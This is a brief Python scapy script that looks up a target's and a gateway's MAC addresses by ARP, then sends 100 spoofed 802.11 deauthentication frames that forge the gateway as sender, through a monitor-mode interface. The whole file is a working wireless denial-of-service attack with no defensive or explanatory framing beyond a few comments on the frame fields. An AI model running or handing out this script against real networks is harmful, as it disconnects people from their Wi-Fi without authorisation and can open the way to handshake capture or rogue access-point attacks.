from scapy.all import *
from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth
from scapy.layers.l2 import ARP, Ether


def get_mac(ip):
    req = ARP(pdst=ip)
    # ff:ff:ff:ff:ff:ff = broadcast
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    req_broadcast = broadcast / req
    # srp stands for send and receive packet.
    res = srp(req_broadcast, timeout=1, verbose=False)[0]
    if len(res) > 0 and len(res[0]) > 0:
        return res[0][1].hwsrc
    else:
        return None


target_mac = get_mac("192.168.1.204")
gateway_mac = get_mac("192.168.1.1")
# 802.11 frame
# addr1: destination MAC
# addr2: source MAC
# addr3: Access Point MAC
dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
# stack them up
packet = RadioTap()/dot11/Dot11Deauth(reason=7)
# send the packet
sendp(packet, inter=0.1, count=100, iface="wlan0mon", verbose=1)